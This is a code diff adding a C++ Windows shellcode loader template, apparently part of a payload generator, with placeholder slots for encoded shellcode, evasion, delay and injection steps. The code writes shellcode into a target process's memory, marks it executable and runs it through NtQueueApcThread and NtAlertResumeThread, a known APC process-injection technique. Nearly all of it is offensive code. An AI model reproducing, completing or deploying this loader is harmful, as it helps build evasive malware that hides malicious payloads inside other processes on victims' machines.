@@ -1,0 +1,88 @@
+#include <iostream>
+#include <windows.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <tchar.h>
+
+//####INCLUDE####
+
+//####DEFINE####
+
+//####CODE####
+
+DWORD WINAPI esc_main(LPVOID lpParameter)
+{
+    DWORD dwSize;
+    //HANDLE currentProcess;
+
+    unsigned char encoded[] = ####SHELLCODE####;
+    SIZE_T length = sizeof(encoded);
+
+
+    //####CALL####
+    unsigned char* decoded = encoded;
+
+
+    //####SYSCALL####
+    HANDLE hProc = NULL;
+    HANDLE hThread = NULL;
+    PVOID base_addr = NULL;
+    SIZE_T bytesWritten = 0;
+    SIZE_T pnew = length;
+    DWORD oldProtect = 0;
+    NTSTATUS status;
+
+    //####INJECTION####
+
+    // Allocate memory for shellcode in target process
+    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status != 0) {
+        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Write shellcode to allocated memory
+    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, &bytesWritten);
+    if (status != 0) {
+        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Change memory protection to executable
+    status = NtProtectVirtualMemory(hProc, &base_addr, &pnew, PAGE_EXECUTE_READ, &oldProtect);
+    if (status != 0) {
+        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Queue APC to the target thread
+    status = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)base_addr, NULL, NULL, NULL);
+    if (status != 0) {
+        std::cerr << "NtQueueApcThread failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Alert the thread to process the APC
+    status = NtAlertResumeThread(hThread, NULL);
+    if (status != 0) {
+        std::cerr << "NtAlertResumeThread failed with status: " << std::hex << status << std::endl;
+        return 1;
+    }
+
+    // Clean up handles
+    NtClose(hThread);
+    NtClose(hProc);
+
+    return 0;
+}
+
+int main()
+{
+    //####DELAY####
+    //####EVASION####
+    //####ARGS####
+
+    esc_main(NULL);
+    return 0;
+}
